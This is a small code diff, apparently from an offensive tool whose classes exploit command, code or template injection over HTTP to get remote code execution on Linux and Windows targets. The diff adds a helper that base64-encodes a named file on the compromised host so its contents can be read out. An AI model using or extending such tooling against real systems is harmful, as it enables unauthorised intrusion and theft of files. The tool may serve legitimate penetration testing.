@@ -207,6 +207,9 @@ class LinuxCommandInjector(CommandInjector):
             self.cwd = "."
         return super().change_directory(directory)
 
+    def base64_cat(self, filename: str) -> str:
+        return self.execute(f"base64 {filename} 2>&1")
+
 
 class WindowsCmdCommandInjector(CommandInjector):
     """ Windows (with Command Prompt) HTTP Client with RCE capabilities via {code,command,template} injection """
